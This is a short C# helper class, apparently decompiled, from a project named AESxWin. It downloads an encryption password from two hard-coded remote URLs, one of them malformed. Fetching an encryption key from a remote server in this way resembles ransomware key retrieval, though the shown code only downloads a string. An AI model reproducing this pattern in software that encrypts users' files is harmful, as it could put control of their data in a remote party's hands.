using System;
using System.Net;
using System.Threading.Tasks;

namespace AESxWin.Helpers;

public static class PasswordAPI
{
	private static int int_0 = 0;

	public static Uri[] Urls = new Uri[2]
	{
		new Uri("http://anna-lewandowska.eu/gen/"),
		new Uri("https://tanopl/ass/")
	};

	public static async Task<string> GetPassword()
	{
		int_0 = 0;
		return await Task.Run(delegate
		{
			string result = string.Empty;
			for (int i = 0; i < Urls.Length; i++)
			{
				if (int_0 + 1 <= Urls.Length)
				{
					try
					{
						WebClient webClient = new WebClient();
						result = webClient.DownloadString(Urls[int_0]);
						int_0 = 0;
					}
					catch (Exception)
					{
						int_0++;
						continue;
					}
					break;
				}
				throw new Exception("Couldn't resolve password");
			}
			return result;
		});
	}
}
